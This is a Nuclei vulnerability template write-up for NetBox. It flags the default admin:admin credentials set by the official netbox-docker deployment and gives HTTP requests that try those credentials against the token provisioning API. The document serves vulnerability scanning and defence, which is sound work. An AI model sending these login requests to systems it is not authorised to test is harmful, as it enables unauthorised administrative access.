# Nuclei Template: NetBox - Default Admin Credentials
**Template ID:** netbox-default-login
**Vulnerability Class:** Use of Default Credentials
**Severity:** High
**Source:** Nuclei Template (`netbox-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Detected that NetBox was using the default credentials admin:admin. The official netbox-docker deployment set SUPERUSER_NAME=admin and SUPERUSER_PASSWORD=admin by default.

## Steps to reproduce / Exploit Payload
```http
GET /login/ HTTP/1.1
Host: {{Hostname}}
Accept: text/html

POST /api/users/tokens/provision/ HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json
Accept: application/json

{"username":"{{username}}","password":"{{password}}"}
```

## References
- https://github.com/netbox-community/netbox-docker
- https://docs.netbox.dev/en/stable/integrations/rest-api/#authenticating-to-the-api
